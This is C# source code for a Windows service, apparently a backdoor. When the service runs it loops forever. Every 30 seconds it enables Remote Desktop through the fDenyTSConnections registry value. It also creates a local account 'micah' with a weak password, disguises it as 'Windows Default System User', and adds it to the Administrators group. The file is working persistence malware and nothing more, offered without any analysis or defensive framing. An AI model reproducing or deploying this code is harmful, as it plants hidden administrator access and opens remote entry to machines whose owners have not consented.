using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Configuration.Install;
using Microsoft.Win32;
using System.DirectoryServices;

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        Thread mainThread;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            mainThread = new Thread(ServiceLoop);
            mainThread.Start();
        }

        private void ServiceLoop()
        {
            while (true)
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server",
                                  "fDenyTSConnections", 0, RegistryValueKind.DWord);
                CreateUser("micah", "test");
                Thread.Sleep(30000);
            }
        }

        private static void CreateUser(string Name, string Pass)
        {
            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                                    Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(Name, "user");
                NewUser.Invoke("SetPassword", new object[] { Pass });
                NewUser.Invoke("Put", new object[] { "Description", "Windows Default System User" });
                NewUser.CommitChanges();
                DirectoryEntry grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
            }
            catch (Exception)
            {
                // Counldnt create users
            }
        }

        protected override void OnStop()
        {
            mainThread.Abort();
        }
    }
}
